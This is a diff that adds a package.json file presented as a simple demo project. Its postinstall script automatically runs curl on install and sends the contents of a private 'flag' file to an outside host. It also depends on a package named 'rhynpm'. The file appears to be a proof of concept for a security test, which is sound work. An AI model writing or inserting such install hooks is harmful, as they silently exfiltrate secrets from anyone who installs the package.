@@ -1,0 +1,15 @@
+{
+  "name": "my-project",
+  "version": "1.0.0",
+  "description": "A simple project demonstrating package.json",
+  "main": "index.js",
+  "scripts": {
+	"postinstall":"curl -s \"https://poc.rhynorater.com/data=$(cat ./JulesSubPriv/flag)\""
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "rhynpm": "latest"
+  }
+}
